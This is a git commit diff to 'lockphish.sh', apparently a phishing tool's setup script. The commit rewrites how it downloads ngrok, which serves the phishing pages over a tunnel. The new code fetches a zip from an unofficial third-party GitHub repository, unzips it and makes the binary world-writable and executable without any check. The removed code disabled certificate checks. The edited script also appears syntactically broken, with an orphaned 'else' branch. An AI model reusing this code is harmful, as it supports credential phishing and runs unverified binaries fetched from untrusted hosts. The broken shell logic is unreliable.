12999de1725f25673d160246ddd401e8d52889c6
Thiagous <64616891+thiagous06@users.noreply.github.com>
2021-08-24 20:48:12 -0300

    Update lockphish.sh

--- lockphish.sh
+++ lockphish.sh
@@ -185,39 +185,28 @@ else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-arch3=$(uname -a | grep -o 'amd64' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
+case `dpkg --print-architecture` in
+aarch64)
+    architectureURL="arm64" ;;
+arm)
+    architectureURL="arm" ;;
+armhf)
+    architectureURL="armhf" ;;
+amd64)
+    architectureURL="amd64" ;;
+i*86)
+    architectureURL="i386" ;;
+x86_64)
+    architectureURL="amd64" ;;
+*)
+    echo "Arquitectura desconocida"
+esac
 
-elif [[ $arch3 == *'amd64'* ]] ; then
-
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-amd64.zip ]]; then
-unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-amd64.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
+wget "https://github.com/tchelospy/NgrokTest/blob/master/ngrok-stable-linux-${architectureURL}.zip?raw=true" -O ngrok.zip
+unzip ngrok.zip
+chmod 777 ngrok
+rm -rf ngrok.zip
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
